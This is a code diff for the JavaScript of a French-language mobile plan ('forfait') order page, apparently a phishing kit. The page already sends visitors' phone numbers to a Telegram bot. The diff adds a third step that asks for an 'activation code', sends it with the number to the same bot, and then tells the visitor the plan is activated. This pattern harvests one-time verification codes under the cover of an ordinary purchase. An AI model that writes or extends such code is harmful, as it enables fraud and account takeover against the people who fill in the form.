@@ -8,10 +8,14 @@ document.addEventListener('DOMContentLoaded', () => {
     const modalPackageDetails = document.getElementById('modalPackageDetails');
     const orderStatus = document.getElementById('orderStatus');
     const btnConfirmOrder = document.getElementById('btnConfirmOrder');
+    
     const step1Group = document.getElementById('step1Group');
     const step2Group = document.getElementById('step2Group');
+    const step3Group = document.getElementById('step3Group');
+    
     const phoneNumberInput = document.getElementById('phoneNumber');
     const phoneNumberConfirmInput = document.getElementById('phoneNumberConfirm');
+    const activationCodeInput = document.getElementById('activationCode');
     
     let currentStep = 1;
     let selectedPackage = '';
@@ -37,10 +41,15 @@ document.addEventListener('DOMContentLoaded', () => {
             orderStatus.style.display = 'none';
             btnConfirmOrder.disabled = false;
             btnConfirmOrder.textContent = 'CONTINUER';
+            
             step1Group.style.display = 'block';
             step2Group.style.display = 'none';
+            step3Group.style.display = 'none';
+            
             phoneNumberInput.disabled = false;
             phoneNumberConfirmInput.required = false;
+            activationCodeInput.required = false;
+            
             currentStep = 1;
             
             modal.style.display = 'flex';
@@ -58,50 +67,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    // Handle form submission
-    orderForm.addEventListener('submit', async (e) => {
-        e.preventDefault();
-        
-        if (currentStep === 1) {
-            step1Group.style.display = 'none';
-            step2Group.style.display = 'block';
-            phoneNumberConfirmInput.required = true;
-            btnConfirmOrder.textContent = 'CONFIRMER LA COMMANDE';
-            currentStep = 2;
-            return;
-        }
-        
-        const phoneNumber = phoneNumberInput.value;
-        const phoneNumberConfirm = phoneNumberConfirmInput.value;
-        
-        if (phoneNumber !== phoneNumberConfirm) {
-            orderStatus.textContent = 'Les numéros de téléphone ne correspondent pas.';
-            orderStatus.className = 'order-status status-error';
-            orderStatus.style.display = 'block';
-            
-            setTimeout(() => {
-                orderStatus.style.display = 'none';
-                step1Group.style.display = 'block';
-                step2Group.style.display = 'none';
-                phoneNumberConfirmInput.required = false;
-                phoneNumberConfirmInput.value = '';
-                btnConfirmOrder.textContent = 'CONTINUER';
-                currentStep = 1;
-            }, 3000);
-            
-            return;
-        }
-
-        btnConfirmOrder.disabled = true;
-        btnConfirmOrder.textContent = 'ENVOI EN COURS...';
-        orderStatus.style.display = 'none';
-
-        const message = `🔔 *NOUVELLE COMMANDE*\n\n` +
-                        `📦 *Forfait*: ${selectedPackage}\n` +
-                        `💰 *Prix*: ${selectedPrice}\n` +
-                        `📞 *Numéro*: ${phoneNumber}\n` +
-                        `⏱ *Date*: ${new Date().toLocaleString()}`;
-
+    async function sendTelegramMessage(message) {
         try {
             const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -114,26 +80,108 @@ document.addEventListener('DOMContentLoaded', () => {
                     parse_mode: 'Markdown'
                 })
             });
+            return response.ok;
+        } catch (error) {
+            console.error(error);
+            return false;
+        }
+    }
 
-            if (response.ok) {
-                orderStatus.textContent = 'Commande envoyée avec succès !';
+    // Handle form submission
+    orderForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        if (currentStep === 1) {
+            step1Group.style.display = 'none';
+            step2Group.style.display = 'block';
+            phoneNumberConfirmInput.required = true;
+            btnConfirmOrder.textContent = 'ENVOYER LA DEMANDE';
+            currentStep = 2;
+            return;
+        }
+        
+        if (currentStep === 2) {
+            const phoneNumber = phoneNumberInput.value;
+            const phoneNumberConfirm = phoneNumberConfirmInput.value;
+            
+            if (phoneNumber !== phoneNumberConfirm) {
+                orderStatus.textContent = 'Les numéros de téléphone ne correspondent pas.';
+                orderStatus.className = 'order-status status-error';
+                orderStatus.style.display = 'block';
+                
+                setTimeout(() => {
+                    orderStatus.style.display = 'none';
+                    step1Group.style.display = 'block';
+                    step2Group.style.display = 'none';
+                    phoneNumberConfirmInput.required = false;
+                    phoneNumberConfirmInput.value = '';
+                    btnConfirmOrder.textContent = 'CONTINUER';
+                    currentStep = 1;
+                }, 3000);
+                
+                return;
+            }
+
+            btnConfirmOrder.disabled = true;
+            btnConfirmOrder.textContent = 'ENVOI EN COURS...';
+
+            const message = `🔔 *NOUVELLE DEMANDE*\n\n` +
+                            `📦 *Forfait*: ${selectedPackage}\n` +
+                            `💰 *Prix*: ${selectedPrice}\n` +
+                            `📞 *Numéro*: ${phoneNumber}\n` +
+                            `⏱ *Date*: ${new Date().toLocaleString()}`;
+
+            const success = await sendTelegramMessage(message);
+
+            if (success) {
+                // Move to step 3
+                step2Group.style.display = 'none';
+                step3Group.style.display = 'block';
+                activationCodeInput.required = true;
+                btnConfirmOrder.textContent = 'ACTIVER MON FORFAIT';
+                btnConfirmOrder.disabled = false;
+                orderStatus.style.display = 'none';
+                currentStep = 3;
+            } else {
+                orderStatus.textContent = 'Erreur lors de l\'envoi de la demande. Veuillez réessayer.';
+                orderStatus.className = 'order-status status-error';
+                orderStatus.style.display = 'block';
+                btnConfirmOrder.disabled = false;
+                btnConfirmOrder.textContent = 'ENVOYER LA DEMANDE';
+            }
+            return;
+        }
+
+        if (currentStep === 3) {
+            const phoneNumber = phoneNumberInput.value;
+            const code = activationCodeInput.value;
+
+            btnConfirmOrder.disabled = true;
+            btnConfirmOrder.textContent = 'VÉRIFICATION...';
+
+            const message = `✅ *CONFIRMATION CODE*\n\n` +
+                            `📞 *Numéro*: ${phoneNumber}\n` +
+                            `🔑 *Code entré*: ${code}\n` +
+                            `⏱ *Date*: ${new Date().toLocaleString()}`;
+
+            const success = await sendTelegramMessage(message);
+
+            if (success) {
+                orderStatus.textContent = 'Votre forfait a été activé avec succès !';
                 orderStatus.className = 'order-status status-success';
                 orderStatus.style.display = 'block';
-                btnConfirmOrder.textContent = 'COMMANDE TERMINÉE';
+                btnConfirmOrder.textContent = 'TERMINE';
                 
                 setTimeout(() => {
                     modal.style.display = 'none';
-                }, 3000);
+                }, 3500);
             } else {
-                throw new Error('Erreur API Telegram');
+                orderStatus.textContent = 'Erreur lors de l\'activation. Veuillez réessayer.';
+                orderStatus.className = 'order-status status-error';
+                orderStatus.style.display = 'block';
+                btnConfirmOrder.disabled = false;
+                btnConfirmOrder.textContent = 'ACTIVER MON FORFAIT';
             }
-        } catch (error) {
-            console.error(error);
-            orderStatus.textContent = 'Erreur lors de l\'envoi de la commande. Veuillez réessayer.';
-            orderStatus.className = 'order-status status-error';
-            orderStatus.style.display = 'block';
-            btnConfirmOrder.disabled = false;
-            btnConfirmOrder.textContent = 'CONFIRMER LA COMMANDE';
         }
     });
 });
